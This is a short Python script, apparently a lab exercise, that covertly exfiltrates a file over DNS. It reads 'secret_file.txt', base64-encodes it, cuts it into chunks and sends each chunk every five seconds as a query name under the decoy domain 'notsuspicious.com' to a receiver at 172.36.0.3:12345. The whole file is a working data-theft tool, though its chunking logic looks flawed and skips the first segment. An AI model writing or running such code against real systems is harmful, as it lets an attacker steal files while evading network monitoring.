import base64
import socket
from time import sleep
import dns.message
import dns.query
import dns.rrset
import dns.rdatatype
import dns.rdataclass
import dns.rdata


def read_file(filename):
    secret_file = open(filename,"r")
    return(str(secret_file.read()))


def dns_compose(text,domain):
    return(str(base64.b64encode(text.encode('utf-8')))+domain)

  

def send_minimal_dns_request(server_ip, domain, port):
    # Stelle sicher, dass der Domainname absolut ist
    if not domain.endswith('.'):
        domain += '.'

    request = dns.message.make_query(domain, dns.rdatatype.TXT)

    additional_data = dns.rdata.from_text(dns.rdataclass.IN, dns.rdatatype.TXT, "benutzerdefinierte Nachricht")

    # Resource Record Set (RRSet) für Additional Section
    rrset = dns.rrset.from_rdata(dns.name.from_text(domain), 300, additional_data)
    request.additional.append(rrset)

    request_bytes = request.to_wire()

    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
        sock.sendto(request_bytes, (server_ip, port))
        print(f"Minimal DNS request sent to {server_ip}:{port}")
        try:
            response_bytes, addr = sock.recvfrom(512)  # DNS-Antworten sind in der Regel maximal 512 Bytes
            response = dns.message.from_wire(response_bytes)  # Konvertiere die Antwort in ein lesbares DNS-Format
            print_records(response, dns.rdatatype.TXT)

        except socket.timeout:
            print("No response received (Timeout)")

def print_records(response, record_type):
    records = []

    for answer in response.answer:
        if answer.rdtype == record_type:
            for item in answer.items:
                if record_type == dns.rdatatype.A:
                    records.append(item.address)  # A-Records (IP-Adressen)
                elif record_type == dns.rdatatype.TXT:
                    records.append(b''.join(item.strings).decode())  # TXT-Records (Text-Daten)
                elif record_type == dns.rdatatype.MX:
                    records.append(f"Priority: {item.preference}, Mail Exchange: {item.exchange}")

    if records:
        print(f"{dns.rdatatype.to_text(record_type)} records found:")
        for record in records:
            print(f"- {record}")
    else:
        print(f"No {dns.rdatatype.to_text(record_type)} records found.")



if __name__ == "__main__":
    receiver_ip = "172.36.0.3"  # Ändere dies in die IP des Empfängers, falls notwendig
    domain_base = "notsuspicious.com"
    secret_text = read_file("secret_file.txt")
    domain_name = dns_compose(secret_text,domain_base)
    for i in range(1,(100+len(domain_name))//50):
        sleep(5)
        if len(domain_name)>=50*(i+1):
            current_domain = domain_name[i*50:(i+1)*50]
        elif len(domain_name)>=50*(i+2):
            current_domain = domain_name[i*50:-1]
        else:
            print("ERROR:Index went past Domain Name length")
            break
        print(f"Sending DNS request {i}")  # Zähle die Anfragen mit
        send_minimal_dns_request(receiver_ip, current_domain, 12345)
